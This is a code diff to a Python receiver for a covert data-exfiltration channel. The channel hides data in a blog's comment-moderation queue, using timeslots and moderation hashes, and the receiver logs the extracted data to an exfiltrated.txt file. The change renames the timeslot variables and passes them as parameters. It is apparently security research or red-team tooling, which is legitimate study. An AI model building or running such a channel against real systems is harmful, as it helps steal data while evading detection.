@@ -14,8 +14,8 @@ ack_channel_id = 7
 exfil_channel = "2021/08/13/exfil-channel/"
 ack_channel = "2021/08/13/ack-channel/"
 
-server_time_slot = 20
-client_time_slot = 10
+recv_time_slot = 10
+process_time_slot = 20
 
 comment_index = 0
 prev_unapproved_index = 0
@@ -72,19 +72,19 @@ for i in range(1, 4):
 if prev_unapproved_index == 0:
     prev_unapproved_index = get_current_unapproved_index()
 
-def receive_data(num_of_receivers):
+def receive_data(num_of_receivers, recv_time_slot, process_time_slot):
     global prev_unapproved_index
 
     received_data = []
     
-    print("[INFO] Delaying to client timeslot. " + str(client_time_slot))
-    delay_to_timeslot(client_time_slot)
+    print("[INFO] Delaying to client timeslot. " + str(recv_time_slot))
+    delay_to_timeslot(recv_time_slot)
     current_hash, server_index = get_moderation_hash_at_current_time()
 
     print("[INFO] Current hash is: " + current_hash)
-    print("[INFO] Delaying to server timeslot. " + str(server_time_slot))
+    print("[INFO] Delaying to server timeslot. " + str(process_time_slot))
 
-    delay_to_timeslot(server_time_slot)
+    delay_to_timeslot(process_time_slot)
 
     index_client = 0
     processed_unapproved_indexes = []
@@ -120,8 +120,8 @@ def receive_data(num_of_receivers):
                     
                     break
             else:
-                print("[INFO] No comment for moderation for " + str(client_time_slot) + " using index " + str(current_unapproved_index) + ". Skipping...")
-        index_client += 1
+                print("[INFO] No comment for moderation for " + str(recv_time_slot) + " using index " + str(current_unapproved_index) + ". Skipping...")
+            index_client += 1
 
     prev_unapproved_index = get_current_unapproved_index()
 
@@ -129,10 +129,10 @@ def receive_data(num_of_receivers):
     
 loop_counter = 99
 while(loop_counter > 0):
-    received_data = receive_data(len(clients))
+    received_data = receive_data(len(clients), recv_time_slot, process_time_slot)
     for exfil_content in received_data:
         to_write = str(datetime.datetime.utcnow()) + ": "
-        to_write += "Extracted data with timeslot of " + str(client_time_slot) + ": " + exfil_content + "\n"
+        to_write += "Extracted data with timeslot of " + str(recv_time_slot) + ": " + exfil_content + "\n"
         print("[INFO] " + to_write);
         f = open("../output/exfiltrated.txt", "a")
         f.write(to_write)
